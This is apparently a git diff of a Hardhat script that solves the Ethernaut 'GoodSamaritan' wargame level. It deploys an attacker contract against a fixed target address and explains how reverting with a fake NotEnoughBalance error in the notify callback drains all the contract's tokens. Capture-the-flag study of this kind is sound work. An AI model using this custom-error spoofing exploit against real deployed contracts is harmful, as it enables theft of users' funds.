@@ -1,33 +1,29 @@
 import { ethers } from "hardhat";
-import { abi } from "../../artifacts/contracts/18.MagicNumber/MagicNumber.sol/MagicNum.json";
 import { Contract, Signer } from "ethers";
 import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
+import { abi as CoinAbi } from "../../artifacts/contracts/27.GoodSamaritan/GoodSamaritan.sol/Coin.json";
+import { abi } from "../../artifacts/contracts/27.GoodSamaritan/GoodSamaritan.sol/GoodSamaritan.json";
+import { deployContract } from "../../utils/deployContract";
+import { displayResult } from "../../utils/displayResult";
 
-import { FactoryOptions } from "hardhat/types";
-
-async function deployContractArg(name: string, arg: any[]) {
-  const ContactFactory = await ethers.getContractFactory(name);
-  const contract = await ContactFactory.deploy(...arg);
-  await contract.deployed();
-  console.log(name, arg[0]);
-  return contract;
-}
-
-async function deployContract(name: string) {
-  const ContactFactory = await ethers.getContractFactory(name);
-  const contract = await ContactFactory.deploy();
-  await contract.deployed();
-  return contract;
-}
+const targetAddress = "0xd47f6c5e8719bd9378830046c2f0aab1c8b140f3";
 
 async function main() {
-  const target = await deployContract("GoodSamaritan");
-  console.log(target.address);
-  const attacker = await deployContractArg("GoodSamaritanAttacker", [
-    target.address,
-  ]);
-  const tx = await attacker.attack();
+  const [attacker]: SignerWithAddress[] = await ethers.getSigners();
+  const goodSamaritanAttacker = await deployContract(
+    "GoodSamaritanAttacker",
+    attacker,
+    [targetAddress]
+  );
+
+  const target = new Contract(targetAddress, abi, attacker);
+  const coin = new Contract(await target.coin(), CoinAbi, attacker);
+  const wallet = new Contract(await target.wallet(), CoinAbi, attacker);
+  const tx = await goodSamaritanAttacker.attack();
   await tx.wait();
+
+  const balance = await coin.balances(wallet.address);
+  displayResult(balance.isZero());
 }
 
 main().catch((error) => {
@@ -35,10 +31,11 @@ main().catch((error) => {
   process.exitCode = 1;
 });
 
-// Explanation:
-// You can easily find the contract created by the recovery contract on etherscan for rinkeby
-
-// of the first storage slot of the calling contract.
-// We are going to put there the address of a library we created.
-// This library, if called in delegate call will change the value of the third
-// storage slot of calling contract, which is in our case, owner.
+/* Explanation:
+  The good samaritan contract in its requestDonation function states that if 
+  wallet.donate10 revert NotEnoughBalance() the msg.sender will receive
+  all the remaining founds...
+  This is somehting we can do thanks to the notify function that the Coin contract
+  will call on our contract. So on first call of notify we will revert, making 
+  the samaritan sending all its tokens and we will make sure to not revert this time.
+ */
